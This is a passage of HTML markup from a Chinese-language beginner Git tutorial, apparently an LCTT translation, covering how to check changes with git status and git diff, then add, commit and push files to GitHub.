data-line=\"crayon-5b623fe06a60f099457229-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a60f099457229-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a60f099457229-1\"><span class=\"crayon-e\">cd </span><span class=\"crayon-v\">Demo</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a60f099457229-2\"><span class=\"crayon-e\">ls</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe06a60f099457229-3\"><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">README</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">md</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a60f099457229-4\"><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Added another line to REAMD.md\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">README</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">md</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe06a60f099457229-5\"><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">README</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">md</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a60f099457229-6\"><span class=\"crayon-e\">git </span><span class=\"crayon-i\">status</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe06a60f099457229-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>如果你逐一运行这些命令，终端看起开将会是这样：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/72ebaab494134e1fef97873629f8df5a.png\" alt=\"\"></p>\n<p>让我们看一下 <code>git status</code> 的输出，并了解它的意思。不要担心这样的语句：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a613397853986\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nOn branch master\r\nYour branch is up-to-date with 'origin/master'.\".\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a613397853986-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a613397853986-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a613397853986-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a613397853986-1\"><span class=\"crayon-e\">On </span><span class=\"crayon-e\">branch </span><span class=\"crayon-e\">master</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a613397853986-2\"><span class=\"crayon-e\">Your </span><span class=\"crayon-e\">branch </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">up</span><span class=\"crayon-o\">-</span><span class=\"crayon-st\">to</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">date </span><span class=\"crayon-i\">with</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'origin/master'</span><span class=\"crayon-sy\">.</span>\"<span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe06a613397853986-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>因为我们还没有学习这些。（LCTT 译注：学了你就知道了）下一行说：<code>Changes not staged for commit</code>（变化未筹划提交）；这是告诉你，它下面列出的文件没有被标记准备（“筹划stage”）提交。如果你运行 <code>git add</code>，Git 会把这些文件标记为 <code>Ready for commit</code>（准备提交）；换句话说就是 <code>Changes staged for commit</code>（变化筹划提交）。在我们这样做之前，让我们用 <code>git diff</code> 命令来检查我们添加了什么到 Git 中，然后运行 <code>git add</code>。</p>\n<p>这里是终端输出：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/2787ca9ba76aedea3d424335e3cd5938.png\" alt=\"\"></p>\n<p>我们来分析一下：</p>\n<ul>\n<li><code>diff --git a/README.md b/README.md</code> 是 Git 比较的内容（在这个例子中是 <code>README.md</code>）。</li>\n<li><code>--- a/README.md</code> 会显示从文件中删除的任何东西。</li>\n<li><code>+++ b/README.md</code> 会显示从文件中添加的任何东西。</li>\n<li>任何添加到文件中的内容都以绿色文本打印，并在该行的开头加上 <code>+</code> 号。</li>\n<li>如果我们删除了任何内容，它将以红色文本打印，并在该行的开头加上 <code>-</code> 号。</li>\n<li>现在 <code>git status</code> 显示 <code>Changes to be committed:</code>（变化将被提交），并列出文件名（即 <code>README.md</code>）以及该文件发生了什么（即它已经被 <code>modified</code> 并准备提交）。</li>\n</ul>\n<p>提示：如果你已经运行了 <code>git add</code>，现在你想看看文件有什么不同，通常 <code>git diff</code> 不会输出任何东西，因为你已经添加了文件。相反，你必须使用 <code>git diff --cached</code>。它会告诉你 Git 添加的当前版本和以前版本文件之间的差别。你的终端输出看起来会是这样：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/9a0c05bdb3439247c9634ec4bf1f3b05.png\" alt=\"\"></p>\n<h3 id=\"toc_3\">上传文件到你的仓库</h3>\n<p>我们用一些新内容修改了 <code>README.md</code> 文件，现在是时候将它上传到 GitHub。</p>\n<p>让我们提交更改并将其推送到 GitHub。运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a617284381970\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit commit -m \"Updated Readme file\"\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a617284381970-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a617284381970-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a617284381970-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">commit</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Updated Readme file\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a617284381970-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这告诉 Git 你正在“提交”已经“添加”的更改，你可能还记得，从本系列的第一部分中，添加一条消息来解释你在提交中所做的操作是非常重要的，以便你在稍后回顾 Git 日志时了解当时的目的。（我们将在下一篇文章中更多地关注这个话题。）<code>Updated Readme file</code> 是这个提交的消息——如果你认为这没有合理解释你所做的事情，那么请根据需要写下你的提交消息。</p>\n<p>运行 <code>git push -u origin master</code>，这会提示你输入用户名和密码，然后将文件上传到你的 GitHub 仓库。刷新你的 GitHub 页面，你应该会看到刚刚对 <code>README.md</code> 所做的更改。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/78dda20702c27aabe4b05aa9195fe867.png\" alt=\"\"></p>\n<p>终端的右下角显示我提交了更改，检查了 Git 状态，并将更改推送到了 GitHub。<code>git status</code> 显示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a61b374639154\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nYour branch is ahead of 'origin/master' by 1 commit\r\n  (use \"git push\" to publish your local commits)\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a61b374639154-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a61b374639154-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a61b374639154-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a61b374639154-1\"><span class=\"crayon-e\">Your </span><span class=\"crayon-e\">branch </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ahead </span><span class=\"crayon-i\">of</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'origin/master'</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">by</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">commit</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a61b374639154-2\"> <span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-st\">use</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"git push\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">publish </span><span class=\"crayon-e\">your </span><span class=\"crayon-e\">local </span><span class=\"crayon-v\">commits</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe06a61b374639154-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>第一行表示在本地仓库中有一个提交，但不在 <code>origin/master</code> 中（即在 GitHub 上）。下一行指示我们将这些更改推送到 <code>origin/master</code> 中，这就是我们所做的。（在本例中，请参阅本系列的第一篇文章，以唤醒你对 <code>origin</code> 含义的记忆。我将在下一篇文章中讨论分支的时候，解释 <code>master</code> 的含义。）</p>\n<h3 id=\"toc_4\">添加新文件到 Git</h3>\n<p>现在我们修改了一个文件并在 GitHub 上更新了它，让我们创建一个新文件，将它添加到 Git，然后将其上传到 GitHub。 运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a61f026630986\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\necho \"This is a new file\" &gt;&gt; file.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a61f026630986-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a61f026630986-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a61f026630986-1\"><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"This is a new file\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a61f026630986-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这将会创建一个名为 <code>file.txt</code> 的新文件。</p>\n<p>如果使用 <code>cat</code> 查看它：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a622768788797\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncat file.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a622768788797-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a622768788797-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a622768788797-1\"><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a622768788797-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>你将看到文件的内容。现在继续运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a625855744037\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit status\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a625855744037-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a625855744037-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a625855744037-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-i\">status</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a625855744037-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>Git 报告说你的仓库中有一个未跟踪的文件（名为 <code>file.txt</code>）。这是 Git 告诉你说在你的计算机中的仓库目录下有一个新文件，然而你并没有告诉 Git，Git 也没有跟踪你所做的任何修改。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/7b5fcf2b0b8426eb0f6947e13740d8b4.png\" alt=\"\"></p>\n<p>我们需要告诉 Git 跟踪这个文件，以便我们可以提交并上传文件到我们的仓库。以下是执行该操作的命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a628994926206\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit add file.txt\r\ngit status\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a628994926206-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a628994926206-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a628994926206-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a628994926206-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">add </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a628994926206-2\"><span class=\"crayon-e\">git </span><span class=\"crayon-i\">status</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe06a628994926206-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>终端输出如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/416a3cda5609a4d6af59d9b3ac7ed5a9.png\" alt=\"\"></p>\n<p><code>git status</code> 告诉你有 